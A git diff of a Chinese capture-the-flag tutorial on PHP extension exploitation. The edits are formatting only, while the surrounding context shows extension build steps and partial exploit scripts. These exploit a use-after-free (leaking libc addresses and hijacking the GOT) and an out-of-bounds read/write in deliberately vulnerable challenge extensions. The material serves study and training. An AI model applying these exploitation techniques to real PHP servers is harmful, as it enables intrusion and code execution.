@@ -38,7 +38,6 @@ docker run -it \
 php81-apache
 ```
 
-
 #### 启动
 ```bash
 docker start php81-apache
@@ -49,13 +48,13 @@ docker exec -it php81-apache bash
 > 搭建好环境就可以自己写拓展了，这和出题一样
 
 ### 解压 php 源码
-```
+```bash
 cd /usr/src
 tar -xvf ./php.tar.xz
 ```
 
 ### 生成拓展模板
-```
+```bash
 cd php-8.1.34/ext
 
 # 在 /workspace 生成了一个名为 apple 的拓展模板
@@ -63,13 +62,13 @@ cd php-8.1.34/ext
 ```
 
 ### 权限修改
-```
+```bash
 cd /workspace/apple
 chmod -R ugo+rw apple
 ```
 
 ### 构建
-```
+```bash
 phpize
 ./configure
 make
@@ -96,7 +95,6 @@ extension=apple.so
 ?>
 ```
 然后访问，发现页面中有 apple 部分的信息
-
 
 ### 自定义内容
 
@@ -156,8 +154,6 @@ Z_PARAM_OPTIONAL 表示可选程序，从这个宏开始，下面内容是可选
 | null | RETURN_NULL | NULL 值 |
 | void | RETURN_VOID | 没有返回值 |
 
-
-
 #### 编写
 修改 apple.stub.php ，声明函数
 ```php
@@ -202,15 +198,14 @@ PHP_MINFO_FUNCTION(apple)
 
 修改之后重新编译安装一遍就好，记得重启下 docker
 在 docker 内
-```
+```bash
 make
 make install
 ```
 然后在宿主机
-```
+```bash
 docker restart php81
 ```
-
 
 #### 验证内容
 
@@ -221,9 +216,8 @@ docker restart php81
   phpinfo();
 ?>
 ```
-./Src 目录挂载了 php81 容器的 /var/www/html 目录，可以直接通过访问容器映射的端口来查看效果  
+./Src 目录挂载了 php81 容器的 /var/www/html 目录，可以直接通过访问容器映射的端口来查看效果
 在浏览器访问 **http://ip:1724/index.php** ，就能看到 phpinfo() 的执行效果，查看到 apple 部分有 author 字段及内容。ip 请根据实际做对应调整。
-
 
 ##### 验证 Recall 函数
 在 ./Src 文件夹下创建文件 test.php ，写如下内容
@@ -238,7 +232,6 @@ docker restart php81
 php test.php
 ```
 看到回显为：`You say: Do you like apple?` ，就是验证成功。
-
 
 ## 漏洞简单研究
 实际比赛就是先得到有漏洞的 .so 文件（有时可能题目附件直接提供），然后分析。
@@ -312,7 +305,7 @@ PHP_FUNCTION(WriteThing)
 ```
 任意注意到，是越界读写的漏洞，正常打 ROP 就好
 
-##### exp
+#### exp
 ```php
 <?php
 
@@ -403,10 +396,8 @@ ptr4 = emalloc(0x60);
 ```
 最后 ptr3 和 ptr1 的值的一样的，ptr4 和 ptr2 的值是一样的。而 efree 后会产生 **ptr1 -> ptr2** 这样的链表结构，只要改写 ptr1 的内容就能劫持链表。
 
-
-
 #### 例题
-  
+
 定义增删改查的函数
 ```php
 function GetNote(int $idx, int $size): void {}
@@ -512,7 +503,6 @@ PHP_FUNCTION(EditNote)
 ```
 是相对明显的 UAF，编译后由于 got 可写，就通过劫持 got 来劫持执行流
 
-
 ##### exp
 ```php
 <?php
@@ -550,7 +540,6 @@ sscanf($line2, "%x", $addr2);
 echo "Libc Address: 0x" . dechex($addr1) . PHP_EOL;
 echo "Apple Address: 0x" . dechex($addr2) . PHP_EOL;
 
-
 GetNote(0, 0x60);
 GetNote(1, 0x60);
 GetNote(2, 0x100);
@@ -572,7 +561,6 @@ EditNote(1, $payload);
 GetNote(0, 0x60);
 GetNote(1, 0x60);
 
-
 $data = [
     $addr1 + 0x53110
 ];
@@ -583,10 +571,7 @@ ThrowNote(4);
 ?>
 ```
 
-
-
-
 ## 参考链接
-[PHP pwn 学习 (1)](https://hornos3.github.io/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/)  
-[[原创]php pwn分析与phpgdb插件](https://bbs.kanxue.com/thread-286446.htm)  
+[PHP pwn 学习 (1)](https://hornos3.github.io/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/)
+[[原创]php pwn 分析与 phpgdb 插件](https://bbs.kanxue.com/thread-286446.htm)
 [PHP `Extension` 开发：用 C 语言扩展 PHP 功能与性能优化](https://www.zyxy.net/archives/12582)
